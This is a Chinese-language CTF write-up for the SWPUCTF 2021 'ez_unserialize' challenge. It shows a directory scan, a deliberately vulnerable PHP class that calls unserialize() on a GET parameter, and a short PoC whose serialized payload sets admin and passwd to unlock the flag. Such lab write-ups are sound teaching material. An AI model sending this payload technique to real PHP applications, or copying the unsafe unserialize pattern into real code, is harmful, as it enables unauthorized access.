# [SWPUCTF 2021 新生赛]ez_unserialize


# [SWPUCTF 2021 新生赛]ez_unserialize

![[SWPUCTF 2021 新生赛]ez_unserialize-1](https://pic.imgdb.cn/item/6539f859c458853aefeeda83.jpg)

扫描目录 `python dirsearch.py -u "http://node5.anna.nssctf.cn:28789/" -e *`

![[SWPUCTF 2021 新生赛]ez_unserialize-2](https://pic.imgdb.cn/item/6539f8a4c458853aefefb1a1.jpg)

访问 robots.txt

![[SWPUCTF 2021 新生赛]ez_unserialize-3](https://pic.imgdb.cn/item/6539f8d5c458853aeff03bb9.jpg)

访问 cl45s.php

![[SWPUCTF 2021 新生赛]ez_unserialize-4](https://pic.imgdb.cn/item/6539f8f0c458853aeff08a0b.jpg)

```php
<?php
error_reporting(0);
show_source("cl45s.php");

class wllm {

    // 声明公共属性 $admin 和 $passwd
    public $admin;
    public $passwd;

    // 构造函数，用于初始化类的属性
    public function __construct() {
        $this->admin = "user";
        $this->passwd = "123456";
    }

    // 析构函数，在对象销毁时自动调用
    public function __destruct() {
        // 如果 $admin 的值为 "admin" 且 $passwd 的值为 "ctf"
        if ($this->admin === "admin" && $this->passwd === "ctf") {
            include("flag.php");
            echo $flag;
        } else {
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

// 从 GET 请求参数中获取名为 "p" 的数据
$p = $_GET['p'];

// 对 "p" 参数执行反序列化操作
unserialize($p);

?>
```

**传给 unserialize() 的参数可控且存在 Magic 方法，存在反序列化漏洞**

> **Magic方法：**
>
> __construct()：构造函数，当对象创建时调用
>
> __destruct()：析构函数，当对象被销毁时调用
>
> __toString()：当对象被当作字符串时使用
>
> __sleep()：在对象序列化的时候调用
>
> __wakeup()：在对象被反序列化时调用
>
> 从序列化到反序列化这几个函数的执行过程：
>
> \_\_construct() ->\_\_sleep() -> \_\_wakeup() -> \_\_toString() -> \_\_destruct()
>
> 详情参考：[PHP反序列化漏洞详解（万字分析、由浅入深）](https://blog.csdn.net/Hardworking666/article/details/122373938)

编写 POC ：

```php
<?php
class wllm
{
   public $admin = admin;
   public $passwd = ctf;

}
$obj = new wllm();
$a = serialize($obj);
echo "?p=".$a;
?> 
```

运行后生成 payload ：`?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";} `

得到 flag

![[SWPUCTF 2021 新生赛]ez_unserialize-5](https://pic.imgdb.cn/item/6539fd9fc458853aeffe3291.jpg)
